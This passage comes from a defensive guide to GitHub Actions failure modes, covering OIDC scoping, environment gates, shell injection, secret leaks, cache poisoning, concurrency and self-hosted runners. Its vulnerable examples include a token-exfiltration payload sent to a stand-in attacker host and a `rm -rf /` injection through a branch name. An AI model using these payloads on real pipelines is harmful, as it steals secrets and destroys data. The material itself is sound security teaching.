**Why it happens:** The `sub` claim in a GitHub OIDC token encodes the full context: `repo:org/repo:ref:refs/heads/main:environment:production:workflow:deploy`. Engineers copying examples use the short form (`repo:org/repo`) for convenience, not realizing the longer form restricts which workflows can authenticate.

**Symptoms:**

- WIF attribute condition uses only `repo` or `repository` without `ref`, `environment`, or `job_workflow_ref`
- Any push to any branch can authenticate to the cloud service account
- `gh api /repos/{owner}/{repo}/actions/secrets` shows GCP credentials accessible to all workflows

**Blast radius:** Any workflow with `id-token: write` can authenticate as the production service account. In a data engineering context: unauthorized BigQuery queries, GCS writes, Firestore mutations, billing cost overruns.

> [!danger] Overly broad OIDC subject claim
>
> ```bash
> # WIF attribute condition — TOO BROAD: any workflow in the repo can authenticate
> attribute.repository == 'alp78/git-lab'
>
> # Also too broad — any branch:
> assertion.sub.startsWith('repo:alp78/git-lab:ref:refs/heads/')
> ```

> [!success] Restrict OIDC to specific branch, environment, and job
>
> ```bash
> # Restrict to the production environment on main branch only:
> attribute.repository == 'alp78/git-lab' &&
> assertion.sub.contains(':ref:refs/heads/main:') &&
> assertion.sub.contains(':environment:production:')
>
> # Or restrict to a specific reusable workflow:
> assertion.sub.contains(':job_workflow_ref:alp78/git-lab/.github/workflows/deploy.yml@refs/heads/main')
> ```

**Subject claim fields and their values:**

| Field | Example value | Restricts to |
|---|---|---|
| `repo` | `alp78/git-lab` | Repository only (overly broad) |
| `ref` | `refs/heads/main` | Specific branch |
| `environment` | `production` | Named environment job |
| `job_workflow_ref` | `org/repo/.github/workflows/deploy.yml@refs/heads/main` | Specific reusable workflow file |
| `workflow` | `Deploy to Production` | Workflow name (mutable — avoid) |

**Prevention protocol:**

1. Always include at least `ref` or `environment` in the WIF attribute condition
2. For production cloud access, require `environment:production` in the subject claim
3. Use `job_workflow_ref` for the most restrictive binding — limits to a specific workflow file at a specific ref
4. Audit WIF pools quarterly: `gcloud iam workload-identity-pools providers describe <name>`

**Immediate response:** Update the WIF attribute condition to restrict the subject claim. Rotate any cloud credentials that may have been accessed from unauthorized workflows.

### permissions | environment protection confusion

**What happens:** A team adds required reviewers to the `production` environment, believing this gates all deployments. An engineer discovers that `workflow_dispatch` with the `environment:` key not set in the job, or a job that uses the environment name only in a secret reference, bypasses the protection rule entirely. Alternatively, a reviewer clicks "Approve" without understanding what they are approving — treating the button as a bureaucratic checkbox rather than a substantive gate.

**Why it happens:** Environment protection rules only apply when the job explicitly references the environment via the `environment:` key. Secrets stored in an environment can be accessed without triggering protection rules if the job uses `secrets.GITHUB_TOKEN` but not `environment:`. Protection rules are also not a substitute for automated testing — they are a human gate only.

**Symptoms:**

- Jobs reference environment-scoped secrets without `environment:` in the job definition
- Approvals happen within seconds of the deploy job appearing — no actual review
- Multiple approvers are listed but only one is ever needed and always approves immediately

> [!warning] Environment key missing — protection rules do not apply
>
> ```yaml
> jobs:
>   deploy:
>     runs-on: ubuntu-latest
>     # Missing: environment: production
>     steps:
>       - run: ./deploy.sh
>         env:
>           DEPLOY_KEY: ${{ secrets.PRODUCTION_DEPLOY_KEY }}
>           # This secret is stored in the production environment,
>           # but without 'environment: production' on the job,
>           # protection rules (required reviewers, wait timer) do not trigger.
> ```

> [!success] Explicitly reference the environment in the job definition
>
> ```yaml
> jobs:
>   deploy:
>     runs-on: ubuntu-latest
>     environment: production   # triggers all protection rules for this environment
>     steps:
>       - run: ./deploy.sh
>         env:
>           DEPLOY_KEY: ${{ secrets.PRODUCTION_DEPLOY_KEY }}
> ```

**Prevention protocol:**

1. Every job that performs a production action must have `environment: production` explicitly in the job definition
2. Do not rely solely on environment approvals as a safety control — always pair with automated smoke tests and rollback procedures
3. Use environment-scoped secrets exclusively for production credentials — prevents accidental use without protection rule enforcement
4. Configure deployment branch policies on the environment to only allow `main`

**Immediate response:** Add `environment:` to any job that should be gated, push the fix. Review recent deploys to confirm they went through the expected approval flow.

## Unsafe interpolation patterns that lead to shell injection

The GitHub expression engine (`${{ }}`) performs raw string substitution before the shell parses the command. This is fundamentally different from environment variable expansion. Every user-controlled value interpolated directly into a `run:` block is a command injection vulnerability.

### injection | command injection from expression interpolation

**What happens:** An attacker crafts a PR title, branch name, or commit message containing shell metacharacters. If the workflow interpolates that value directly into a `run:` step using `${{ github.event.pull_request.title }}`, the shell interprets the injected payload. The attacker can exfiltrate secrets, modify files, or call arbitrary endpoints — all within the runner's execution context.

**Why it happens:** `${{ }}` expressions in `run:` steps are substituted by the expression engine before the shell sees the line. There is no automatic escaping. A value like `"; curl https://attacker.com?t=$GITHUB_TOKEN #"` becomes a second command when placed inside a double-quoted shell string.

**Symptoms:**

- Workflow `run:` steps contain `${{ github.event.pull_request.title }}`, `${{ github.head_ref }}`, or similar user-controlled context values
- `actionlint` reports "expression value is used for untrusted input"

**Blast radius:** Full secrets exfiltration within a single workflow run; `GITHUB_TOKEN` abuse — creating releases, modifying code, opening PRs; persistent access if the attacker writes a backdoor via write token; in financial pipelines, injection into a data processing workflow can corrupt index calculations.

The following demonstration was committed and triggered via `workflow_dispatch` with `pr_title="Add feature X; echo INJECTED"` (run 24314562791, 3s).

*Demonstrate that env-var injection is safe even with shell-metacharacter input.*

```yaml
name: "Demo: Problems | Injection-Safe Patterns"

on:
  workflow_dispatch:
    inputs:
      pr_title:
        description: "Simulated PR title (try injecting shell chars)"
        required: false
        default: "Add feature X"

jobs:
  demonstrate-safe-injection:
    runs-on: ubuntu-latest
    permissions:
      contents: read
    steps:
      - name: Safe pattern — PR_TITLE is data, not code
        run: |
          echo "PR title received: $PR_TITLE"
          echo "Length of title: ${#PR_TITLE}"
          echo "No injection possible — shell treats PR_TITLE as data."
        env:
          PR_TITLE: ${{ github.event.inputs.pr_title }}

      - name: Validate branch name before use (allowlist pattern)
        run: |
          if [[ "$BRANCH_NAME" =~ ^[a-zA-Z0-9/_.-]+$ ]]; then
            echo "Branch name is safe: $BRANCH_NAME"
          else
            echo "::error::Branch name contains invalid characters: $BRANCH_NAME"
            exit 1
          fi
        env:
          BRANCH_NAME: ${{ github.event.inputs.branch_name }}

      - name: Demonstrate add-mask for derived secrets
        run: |
          SIMULATED_CRED="demo-credential-value"
          ENCODED=$(echo -n "$SIMULATED_CRED" | base64)
          echo "::add-mask::$ENCODED"
          echo "Encoded: $ENCODED"   # shows *** in log — masked
          echo "Step complete — derived value was masked before use."
```

*Workflow run output (run 24314562791, workflow_dispatch, pr_title="Add feature X; echo INJECTED"):*

```text
# captured from: gh run view 24314562791 --log
✓ demonstrate-safe-injection in 3s (ID 70989922344)

GITHUB_TOKEN Permissions:
  Contents: read
  Metadata: read

=== Safe pattern — PR_TITLE is data, not code ===
PR title received: Add feature X; echo INJECTED
Branch name received: feature/demo-branch
Length of title: 28
No injection possible — shell sees these as environment variable values.

=== Branch name validation ===
Branch name is safe: feature/demo-branch

=== ::add-mask:: for derived values ===
Encoded value is now masked in logs.
Encoded: ***
Step complete — derived value was masked before use.
```

The input `Add feature X; echo INJECTED` — which contains the shell command separator `;` followed by `echo INJECTED` — was received as a data value and printed literally. The `echo INJECTED` was never executed. When the same value would be interpolated inline (`echo "PR: ${{ github.event.inputs.pr_title }}"`) the shell would see `echo "PR: Add feature X"; echo INJECTED` and execute both commands.

> [!danger] Direct expression interpolation in run: block
>
> ```yaml
> # VULNERABLE: ${{ }} is substituted before shell parsing
> - run: echo "Processing PR: ${{ github.event.pull_request.title }}"
> # Attacker title: "; curl https://attacker.com?t=$GITHUB_TOKEN #
> # Shell sees:  echo "Processing PR: "; curl https://...  #"
>
> # ALSO VULNERABLE: branch name in git command
> - run: git checkout ${{ github.head_ref }}
> # Attacker branch: main; rm -rf /
> ```

> [!success] Always pass user-controlled values via env:
>
> ```yaml
> - name: Process PR title
>   run: echo "Processing PR: $PR_TITLE"
>   env:
>     PR_TITLE: ${{ github.event.pull_request.title }}
>     # Shell expands $PR_TITLE as a variable — no injection possible
>
> - name: Checkout branch (validated)
>   run: |
>     if [[ "$BRANCH" =~ ^[a-zA-Z0-9/_.-]+$ ]]; then
>       git checkout "$BRANCH"
>     else
>       echo "::error::Invalid branch name" && exit 1
>     fi
>   env:
>     BRANCH: ${{ github.head_ref }}
> ```

**Prevention protocol:**

1. Run `actionlint` — it detects `${{ }}` interpolation in `run:` contexts automatically
2. Global rule: any user-controlled value (`github.event.pull_request.*`, `github.head_ref`, commit messages, issue titles) must go via `env:`, never interpolated
3. Use `github-script` for operations that need structured access to user-controlled data — JavaScript string handling has no shell injection surface
4. Apply restrictive `permissions: {}` to limit blast radius of any successful injection

**Immediate response:**

1. Identify the exposure window and collect all run logs
2. Rotate all secrets accessible during that workflow's execution
3. Review git history for unauthorized changes: `git log --all --oneline --since="<date>"`
4. Patch the workflow, add `actionlint` to block regression

### injection | secret exposure in logs

**What happens:** Secrets are printed to logs via `echo`, interpolated into URLs, error messages, or curl commands. GitHub masks known secret values in logs — but only exact string matches. Concatenation, encoding, substring extraction, or base64 wrapping bypasses the masking. The result: a secret appears in plain text in a log that anyone with read access to the repo can view.

**Why it happens:** `${{ secrets.TOKEN }}` in a `run:` block performs substitution before the shell sees the line. Engineers accustomed to environment variables — which are harder to accidentally print — are surprised by how easily `${{ }}` expressions leak into visible contexts.

**Symptoms:**

- `run:` steps use `${{ secrets.* }}` directly rather than via `env:`
- Derived values (base64-encoded credentials, concatenated tokens) appear unmasked in logs

> [!warning] Secret leak vectors in run: steps
>
> ```yaml
> # BAD: Direct echo — GitHub may mask, but this is still dangerous practice
> - run: echo "Token is ${{ secrets.API_TOKEN }}"
>
> # BAD: Interpolated into a URL (GitHub won't mask partial matches)
> - run: curl "https://api.example.com?token=${{ secrets.API_TOKEN }}"
>
> # BAD: base64 encoding bypasses masking
> - run: |
>     encoded=$(echo -n "${{ secrets.API_KEY }}" | base64)
>     curl -H "Authorization: Basic $encoded" https://api.example.com
>     # $encoded is NOT masked — GitHub only masks the original secret value
> ```

> [!success] Inject via env: and mask all derived values
>
> ```yaml
> - run: |
>     encoded=$(echo -n "$API_KEY" | base64)
>     echo "::add-mask::$encoded"   # mask the derived value immediately
>     curl -H "Authorization: Basic $encoded" https://api.example.com
>   env:
>     API_KEY: ${{ secrets.API_KEY }}
> ```

**Prevention protocol:**

1. Never use `${{ secrets.* }}` inside `run:` blocks — always pass via `env:`
2. Use `::add-mask::` for any value computed from a secret before it appears in any log output
3. Run `actionlint` — it warns on `${{ secrets.* }}` in `run:` contexts
4. Set log retention to 30 days minimum in Settings → Actions → General

**Immediate response:**

1. If a secret was printed: assume it was compromised — rotate immediately
2. Delete the specific log run: `gh api -X DELETE /repos/{owner}/{repo}/actions/runs/{run_id}/logs`
3. Audit who accessed the repo within the log retention window

## Stale artifacts, poisoned caches, and broken data flow

### artifacts | stale artifact downloads on rerun

**What happens:** A deploy workflow uploads a build artifact, then a separate deployment job downloads and deploys it. A developer re-runs only the deploy job (not the full workflow). The job downloads the artifact from a previous run — silently deploying an older version of the code. The developer believes they deployed the latest commit.

**Why it happens:** `actions/download-artifact` defaults to downloading from the current run. When a job is re-run in isolation, the "current run" may not have produced a new artifact — GitHub falls back to the most recent artifact with that name from any run, which may be stale.

**Blast radius:** Silent deployment of wrong code version; in data pipelines, a stale ETL image can process data with the wrong schema transformations, producing corrupted output that may not be detected until downstream.

> [!warning] Rerunning only the deploy job downloads a stale artifact
>
> ```yaml
> jobs:
>   build:
>     steps:
>       - uses: actions/upload-artifact@v4
>         with:
>           name: dist          # same name every run
>           path: dist/
>
>   deploy:
>     needs: build
>     steps:
>       - uses: actions/download-artifact@v4
>         with:
>           name: dist          # no run-id — silently stale on isolated re-run
> ```

> [!success] Always pass explicit run-id via job outputs
>
> ```yaml
> jobs:
>   build:
>     outputs:
>       artifact-run-id: ${{ github.run_id }}
>     steps:
>       - uses: actions/upload-artifact@6f51ac03b9356f520e9adb1b1b7802705f340c2d  # v4.5.0
>         with:
>           name: dist-${{ github.sha }}   # SHA in name makes staleness visible
>           path: dist/
>
>   deploy:
>     needs: build
>     steps:
>       - uses: actions/download-artifact@fa0a91b85d4f404e444306234fdfd2fc898be651  # v4.1.8
>         with:
>           name: dist-${{ github.sha }}
>           run-id: ${{ needs.build.outputs.artifact-run-id }}
>           github-token: ${{ secrets.GITHUB_TOKEN }}
> ```

**Prevention protocol:**

1. Always pass `run-id:` explicitly in `download-artifact` — use job outputs to thread the ID
2. Include the git SHA in the artifact name: `name: dist-${{ github.sha }}`
3. For production deploys, always re-run the full workflow, never only the deploy job
4. Prefer container image tags (git SHA-based) over artifact files for deployments — image tags are immutable

**Long-term remediation:** For critical deploy workflows, add a pre-deploy step that validates the artifact SHA matches `github.sha` before proceeding.

### cache | cache poisoning and stale state in privileged workflows

**What happens:** A developer pushes a branch that installs a maliciously modified `requirements.txt` (pointing to a compromised package) and runs the workflow. The workflow caches the installed packages. A subsequent privileged workflow (e.g., a `workflow_run` triggered after merge) restores the poisoned cache and uses the compromised packages — with full secrets access.

A simpler variant: stale dependencies from a feature branch cache persist when that branch's cache key is used as a `restore-keys` fallback in the main branch workflow, silently installing outdated packages that fail to reproduce deterministic builds.

**Why it happens:** GitHub Actions cache is scoped per branch by default, but `restore-keys:` partial matches allow cross-branch cache restoration. A low-privilege branch write can poison a cache key that a high-privilege workflow subsequently restores.

**Blast radius:** Compromised package running with production secrets; non-deterministic builds that pass CI on some runs and fail on others; hard-to-diagnose dependency version drift.

> [!danger] restore-keys partial match can restore poisoned or stale cache
>
> ```yaml
> - uses: actions/cache@v4
>   with:
>     path: ~/.cache/pip
>     key: pip-${{ runner.os }}-${{ hashFiles('**/requirements.txt') }}
>     restore-keys: |
>       pip-${{ runner.os }}-
>       # This fallback can restore from any branch that used pip-Linux- as prefix
>       # including untrusted feature branches that may have cached malicious packages
> ```

> [!success] Restrict cache scope for privileged workflows
>
> ```yaml
> # For privileged workflows (triggered by workflow_run on merge, deploy workflows):
> # Do not use restore-keys — only restore on exact match, fail fast on miss
> - uses: actions/cache@v4
>   id: pkg-cache
>   with:
>     path: ~/.cache/pip
>     key: pip-${{ runner.os }}-${{ hashFiles('**/requirements.txt') }}-main
>     # No restore-keys — exact match only for privileged jobs
>
> # If cache misses, always reinstall from scratch:
> - if: steps.pkg-cache.outputs.cache-hit != 'true'
>   run: pip install -r requirements.txt --require-hashes
>   # --require-hashes ensures pip verifies content integrity against lockfile hashes
> ```

**Prevention protocol:**

1. For workflows with access to production secrets or cloud credentials, do not use `restore-keys:`
2. Use `--require-hashes` with pip (or equivalent for npm/cargo) to verify package content integrity
3. Pin the cache key to include the target branch: `key: pip-${{ runner.os }}-${{ hashFiles('requirements.txt') }}-${{ github.ref_name }}`
4. Periodically flush caches for privileged workflows: Settings → Actions → Caches

### artifacts | attestation and provenance not enforced

**What happens:** A team builds and publishes container images and Python packages. No provenance records are generated. A downstream consumer cannot verify whether an image they pulled was built from the expected source commit, by the expected workflow, or whether the image was tampered with after the build. In a supply-chain compromise scenario, a malicious actor replaces the legitimate artifact with a backdoored one and there is no mechanism to detect the substitution.

**Why it happens:** Artifact attestation requires explicit configuration (`actions/attest-build-provenance`). It is not automatic. Many pipelines were built before attestation tooling was available.

**Blast radius:** Undetectable supply-chain compromise; inability to meet SLSA Level 2 requirements; regulatory non-compliance in environments requiring build provenance (e.g., FedRAMP, SOC 2 for software supply chain controls).

> [!info] Generate attestation alongside artifact upload
>
> ```yaml
> jobs:
>   build:
>     permissions:
>       contents: read
>       id-token: write       # required for OIDC signing
>       attestations: write   # required to create attestation records
>     steps:
>       - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683  # v4.2.2
>       - name: Build image
>         id: build
>         run: |
>           docker build -t myapp:${{ github.sha }} .
>           echo "digest=$(docker inspect --format='{{index .RepoDigests 0}}' myapp:${{ github.sha }})" >> $GITHUB_OUTPUT
>       - name: Generate provenance attestation
>         uses: actions/attest-build-provenance@6149ea5740be74af77f260b9db67e633f6b0a9a1  # v1.4.3
>         with:
>           subject-name: ghcr.io/alp78/myapp
>           subject-digest: ${{ steps.build.outputs.digest }}
>           push-to-registry: true
> ```

**Prevention protocol:**

1. Add `actions/attest-build-provenance` to every workflow that publishes artifacts, images, or packages
2. Require attestation verification in deploy workflows: `gh attestation verify <artifact> --owner <org>`
3. Set `attestations: write` permission on build jobs — it is not granted by default
4. For PyPI packages, use OIDC-based Trusted Publisher (no API token needed) with provenance generation via `pypa/gh-action-pypi-publish`

## Concurrency mistakes that break deploy ordering

### concurrency | duplicate deploys from race condition

**What happens:** Multiple PRs are merged in quick succession. Five concurrent deploy workflows run simultaneously — one for each merge. They all target the same environment and step on each other: conflicting database migrations, deployments out of sequence, or exceeded cloud API rate limits. Alternatively, `cancel-in-progress: true` is set on a deploy workflow, and a partial deploy is cancelled mid-execution, leaving the environment in an inconsistent state.

**Why it happens:** GitHub Actions has no built-in deploy locking. `concurrency:` either cancels running instances or queues them, but neither mode is always correct for deploys.

> [!danger] cancel-in-progress: true on a deploy workflow
>
> ```yaml
> concurrency:
>   group: deploy-production
>   cancel-in-progress: true   # DANGEROUS for deploys: partial deploy state is corrupted
>   # If a deploy is 60% complete when a new push arrives, it is cancelled mid-flight
> ```

> [!success] Correct concurrency by workflow type
>
> ```yaml
> # PR validation: safe to cancel
> concurrency:
>   group: pr-${{ github.ref }}
>   cancel-in-progress: true
>
> # Deployments: queue, never cancel mid-run
> concurrency:
>   group: deploy-${{ inputs.environment || 'production' }}
>   cancel-in-progress: false   # new runs queue; running deploy completes
>
> # Scheduled ETL: skip if already running (don't overlap)
> concurrency:
>   group: scheduled-etl
>   cancel-in-progress: false
> ```

| Workflow type | `cancel-in-progress` | Reason |
|---|---|---|
| PR lint/test | `true` | Safe — CI just restarts on next push |
| Deploy to staging | `false` | Avoid partial deploy state |
| Deploy to production | `false` | Must complete atomically |
| Scheduled data load | `false` | Prevent duplicate data processing |
| Cost monitoring | `true` | No state impact |

**Prevention protocol:**

1. Always use `concurrency:` on any workflow that modifies shared state
2. Use `cancel-in-progress: false` for deploy workflows
3. Include the environment name in the concurrency group to allow parallel deploys to dev/staging/prod
4. Use GitHub Environments with required reviewers as a human gate for production

**Immediate response:** If a partial deploy occurred due to cancellation, manually complete or roll back the affected operation. Check the environment's health before re-running.

### workflow edits | broken production deploys from direct edits

**What happens:** A developer modifies a deploy workflow directly on main without a PR. The change contains a bug. The next merge to main triggers the broken workflow, the deploy fails, and production is blocked until the file is fixed. Because the workflow IS the gating mechanism, a broken workflow means no deployments can complete.

**Prevention protocol:**

1. Add to `.github/CODEOWNERS`: `.github/workflows/ @platform-team`
2. Enable branch protection with "Require review from Code Owners" for `.github/workflows/**`
3. Add `actionlint` as a required check on PRs touching `.github/workflows/`
4. Keep a `workflow_dispatch` emergency trigger as a fallback even if push-triggered deploys are broken

### reusable workflows | version drift breaking consumers

**What happens:** An org standardizes on reusable workflows stored in a central repo. The central repo updates the called workflow in a breaking way — changing required inputs, removing outputs, or altering behavior. Every caller repo breaks silently at the next CI run. There is no semantic versioning, no deprecation notice, and no consumer registry.

**Why it happens:** Reusable workflows referenced by branch (`uses: org/repo/.github/workflows/deploy.yml@main`) are mutable. A change to `main` in the central repo is immediately visible to all callers. There is no packaging model that enforces compatibility.

**Symptoms:**

- Multiple repos' CI starts failing simultaneously after a central workflow change
- Callers use `@main` or `@HEAD` rather than a pinned tag or SHA
- No changelog exists for the central workflow repo

> [!warning] Reusable workflow referenced by mutable branch
>
> ```yaml
> # All callers break instantly when deploy.yml on main changes
> jobs:
>   call-deploy:
>     uses: org/platform/.github/workflows/deploy.yml@main
>     # @main is mutable — any push to main in 'platform' repo affects all callers
> ```

> [!success] Pin to a versioned tag or SHA, maintain a changelog
>
> ```yaml
> jobs:
>   call-deploy:
>     uses: org/platform/.github/workflows/deploy.yml@v2.1.0  # pinned tag
>     # or pin to SHA for immutability:
>     uses: org/platform/.github/workflows/deploy.yml@abc1234  # SHA pin
>
> # In the platform repo — maintain semantic versions:
> # git tag v2.1.0 && git push origin v2.1.0
> # CHANGELOG.md with breaking-change notices
> ```

**Prevention protocol:**

1. Reference reusable workflows by version tag or SHA, not `@main`
2. Publish a `CHANGELOG.md` in the central workflow repo — version every breaking change
3. For `secrets: inherit` vs explicit secrets, prefer `inherit` to reduce caller maintenance burden
4. Maintain a registry of callers so breaking changes can be announced proactively

## Self-hosted runner risks from persistence and shared trust

Self-hosted runners require the same hardening discipline as production servers. Unlike GitHub-hosted runners — which are ephemeral, clean, and managed — self-hosted runners carry persistent state, shared network access, and org-level trust that makes failures significantly more dangerous.

### self-hosted | runner state persistence and secret leakage

**What happens:** A long-lived self-hosted runner processes job A (which writes a secret to a temp file for convenience). Job B — from a different repository — runs on the same runner and finds the temp file on disk, or inherits environment variables set by the previous job's post-steps. The secret is now accessible to an unrelated team's workflow.

**Why it happens:** Persistent (non-ephemeral) runners do not wipe the workspace between jobs unless explicitly configured to do so. Environment variables set in a job's steps do not automatically clear before the next job. Temp files written to `/tmp` or the workspace directory persist until manually deleted or the runner is restarted.

**Blast radius:** Cross-job and cross-repo credential leakage; production service account keys accessible to development workflows sharing the same runner pool; in a financial org, trading system credentials accessible to a data analytics workflow on the same runner.

> [!danger] Persistent runner with shared workspace
>
> ```yaml
> # Job A — writes credential for convenience
> - run: |
>     echo "${{ secrets.PROD_DB_PASSWORD }}" > /tmp/.db-pass
>     ./deploy.sh
>     # /tmp/.db-pass is NOT cleaned up — persists for next job on this runner
>
> # Job B — different repo, same runner pool
> - run: |
>     cat /tmp/.db-pass   # Job B can read Job A's credential
> ```

> [!success] Use ephemeral (JIT) runners, or implement explicit workspace cleanup
>
> ```yaml
> # Option 1 (preferred): Use GitHub's JIT ephemeral runner — terminated after each job
> runs-on:
>   - self-hosted
>   - ephemeral        # JIT runner is destroyed after this job
>
> # Option 2: Explicit cleanup as a post-step that always runs
> - name: Cleanup sensitive files
>   if: always()
>   run: |
>     find /tmp -maxdepth 1 -name '.*' -delete
>     rm -f "$GITHUB_WORKSPACE/.env" "$GITHUB_WORKSPACE/secrets.json"
>     unset PROD_DB_PASSWORD GITHUB_TOKEN
> ```

**Runner persistence risk table:**

| State type | Persists on non-ephemeral runner | Mitigation |
|---|---|---|
| Workspace files | Yes — until explicitly deleted | `rm -rf $GITHUB_WORKSPACE/*` in cleanup |
| `/tmp` files | Yes — until OS reboot | Explicit `rm` or use per-job subdirs |
| Environment variables | No — cleared between jobs by the runner agent | N/A |
| Docker layer cache | Yes — on runners with Docker | `docker system prune -f` in cleanup |
| npm/pip cache | Yes — if `~/.cache` is on the runner FS | Pin cache dirs to job workspace |
| Shell history | Yes — `~/.bash_history` on runner user | Disable history: `HISTFILE=/dev/null` |

**Prevention protocol:**

1. Use JIT/ephemeral runners for all workflows that access secrets — eliminate state persistence by design
2. If persistent runners are unavoidable, implement a `cleanup` job that runs `if: always()` and wipes the workspace
3. Separate runner pools by trust level: production workflows use a dedicated runner group inaccessible to dev/fork workflows
4. Enable runner group access control: Settings → Actions → Runner groups — restrict to specific repositories

### self-hosted | cross-repo contamination via runner group misconfiguration

**What happens:** A runner group is created with "Allow public repositories" or "Allow all repositories in the organization" enabled. A low-trust repo (a developer's experimental fork, a contractor's project) schedules a workflow on the shared runner group. That workflow reads the runner's filesystem, network configuration, or environment for artifacts left by higher-trust workflows.

**Why it happens:** Runner groups default to being available to all repositories in the org. Engineers add runners to a group for convenience without reviewing which repos can access it.

**Prevention protocol:**

1. Create separate runner groups per trust tier: `prod-runners`, `staging-runners`, `dev-runners`
2. Restrict each runner group to the specific repositories that legitimately need it
3. Disable "Allow public repositories" on all self-hosted runner groups
4. Audit runner group permissions quarterly: `gh api /orgs/{org}/actions/runner-groups`

### self-hosted | network egress too broad

**What happens:** A self-hosted runner is deployed on an internal network with direct access to production databases, data warehouses, and internal APIs — because that is the most convenient way to run integration tests. A compromised workflow (injection attack, malicious action) can then directly query production systems, exfiltrate data, or trigger destructive operations.

**Prevention protocol:**

1. Run self-hosted runners in a dedicated subnet with strict egress rules: allow only required external endpoints (GitHub, cloud APIs), block direct internal production system access
2. Use a jump host or service mesh with mutual TLS for any workflow that needs internal system access — do not colocate the runner on the internal production network
3. For data engineering: test workflows against a read-only replica or sandbox environment, not production

### self-hosted | ephemeral vs long-lived runner comparison

| Property | GitHub-hosted (ephemeral) | Self-hosted ephemeral (JIT) | Self-hosted persistent |
|---|---|---|---|
| State after job | Destroyed | Destroyed | Retained |
| Secret leakage risk | None | None | High |
| Setup time | 30–120s queue + start | 60–300s JIT provision | Near-instant |
| OS control | GitHub-managed | Operator-managed | Operator-managed |
| Cost | Per-minute billing | Infrastructure cost | Infrastructure cost |
| Recommended for | Most workflows | Sensitive workflows needing custom env | Only with strict cleanup policies |
| Runner image drift | Controlled by GitHub | Operator-controlled | Operator-controlled |

## Third-party action risks and update fatigue

### supply chain | SHA pinning fatigue and policy drift

**What happens:** The security team mandates pinning all actions to commit SHAs. Every reference looks like `uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683`. Dependabot opens 40 PRs per month updating these SHAs. Engineers stop reviewing them — the SHA is opaque. Dependabot PRs accumulate. The team disables Dependabot to reduce noise, defeating the purpose of pinning. A new action with `uses: google-github-actions/auth@v2` (mutable tag) slips in during a feature PR because no one checks.

**Why it happens:** SHA pinning is correct security practice but creates a usability tradeoff. Tags are human-readable but mutable. SHAs are immutable but opaque. There is no middle ground in GitHub's syntax.

> [!warning] Mutable tag allows silent action substitution
>
> ```yaml
> # UNSAFE: an attacker who compromises the actions/checkout repo
> # can move the v4 tag to point to malicious code
> - uses: actions/checkout@v4
>
> # ALSO UNSAFE: patch versions are still mutable
> - uses: actions/checkout@v4.2.2
> ```

> [!success] SHA pin with version comment, Dependabot on weekly schedule
>
> ```yaml
> steps:
>   - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683        # v4.2.2
>   - uses: actions/setup-python@0b93645e9fea7318ecaed2b359559ac225c90a2b    # v5.3.0
>   - uses: google-github-actions/auth@71f986410dfbc7added4569ffef1e041e5b6c0f  # v2.1.8
>
> # .github/dependabot.yml — weekly grouped updates reduce noise
> version: 2
> updates:
>   - package-ecosystem: github-actions
>     directory: /
>     schedule:
>       interval: weekly
>       day: monday
>     groups:
>       official-actions:
>         patterns: ["actions/*"]
>       gcp-actions:
>         patterns: ["google-github-actions/*"]
> ```

**Prevention protocol:**

1. Run `npx pin-github-action .github/workflows/*.yml` to convert all tag references to SHAs in one pass
2. Always append a `# vX.Y.Z` comment after the SHA — preserve human readability
3. Configure Dependabot with a weekly schedule and `groups:` to batch related updates into one PR
4. Use `zizmor` to enforce SHA pinning as a required CI check

**Immediate response:** If mutable tags are in use, run `pin-github-action` and merge the result. Then enable Dependabot with the grouped schedule before closing the task.

## Governance gaps that leave workflows unowned and fragile

### governance | no workflow ownership / CODEOWNERS

**What happens:** A deploy workflow has been failing intermittently for three months. No one knows who owns it. `git blame .github/workflows/deploy.yml` shows 15 different contributors, each adding one line. There is no workflow owner defined anywhere. The platform team is paged when it breaks, but the workflow was originally written by the data team. Fixes are slow because responsibilities are unclear.

**Prevention protocol:**

1. Add to `.github/CODEOWNERS`:

```
   .github/workflows/deploy*.yml    @platform-team
   .github/workflows/data-*.yml     @data-team
   .github/workflows/security*.yml  @security-team
```

2. Add a `# Owner: @team-name` comment at the top of every workflow file
3. Create a workflow registry in the repo wiki with owner, oncall, SLA, and description per workflow
4. Quarterly audit: `git log --follow .github/workflows/` for orphaned or unmaintained files

### governance | alert fatigue and missing escalation paths

**What happens:** Workflow failure notifications go to a shared Slack channel monitored by no one in particular. A critical deploy failure at 02:00 is not noticed until 08:00. In a financial data org, this means a missed index calculation window or a delayed regulatory data delivery.

**Prevention protocol:**

1. Route failure alerts for production deploy workflows to a PagerDuty service or on-call rotation, not a shared chat channel
2. Use `on: workflow_run` to create a dedicated alert workflow that fires only on failure conclusions and pages the on-call
3. Set notification policies: `notify on failure` for CI, `notify on failure AND success` for production deploys (the success notification confirms the deploy completed)
4. Define and document escalation paths: "If deploy fails and is not acknowledged in 15 minutes, page the on-call lead"

### governance | YAML untestability and long feedback loops

**What happens:** YAML is a data format, not a programming language with a test framework. Workflows encode business logic — deployment gates, notification rules, conditional steps — with no unit tests, no type system, and no debugger. Logic errors in conditionals (`if:`) are discovered only when the specific branch is hit in production. A developer iterates through 10-14 push/wait cycles to debug a workflow change.

**Common YAML expression traps:**

```yaml
# TRAP 1: failure() without always() — cleanup step may not run
- name: Cleanup
  if: failure()    # only if the job failed
  run: ./cleanup.sh
- name: Always cleanup
  if: always()     # runs regardless of prior step status — use this for cleanup

# TRAP 2: needs context not available for the job itself
jobs:
  deploy:
    needs: build
    if: needs.build.result == 'success'   # CORRECT
    # if: success()                       # also works but less explicit

# TRAP 3: null-unsafe label check
if: contains(github.event.pull_request.labels.*.name, 'deploy')
# SAFER:
if: contains(toJSON(github.event.pull_request.labels.*.name), 'deploy')

# TRAP 4: String comparison with booleans
if: github.event.inputs.debug == true    # WRONG — input is always a string
if: github.event.inputs.debug == 'true'  # CORRECT
```

**Prevention protocol:**

1. Run `actionlint` as a pre-push hook — catches ~80% of expression errors in seconds
2. Add `workflow_dispatch` with debug inputs to every workflow for ad-hoc testing without waiting for CI queues
3. Use `act` for local syntax validation: `act pull_request --dry-run`
4. Add `ACTIONS_STEP_DEBUG=true` to repo secrets when debugging expression evaluation — produces verbose expression traces

## Data-engineering failures with high cost or high blast radius

Data engineering workflows interact with expensive, stateful external systems — data warehouses, streaming platforms, orchestration engines, and infrastructure provisioning tools. Misconfiguration does not just slow down CI; it corrupts data, triggers costly queries, or deploys infrastructure changes without review.

### data engineering | expensive warehouse queries on every PR

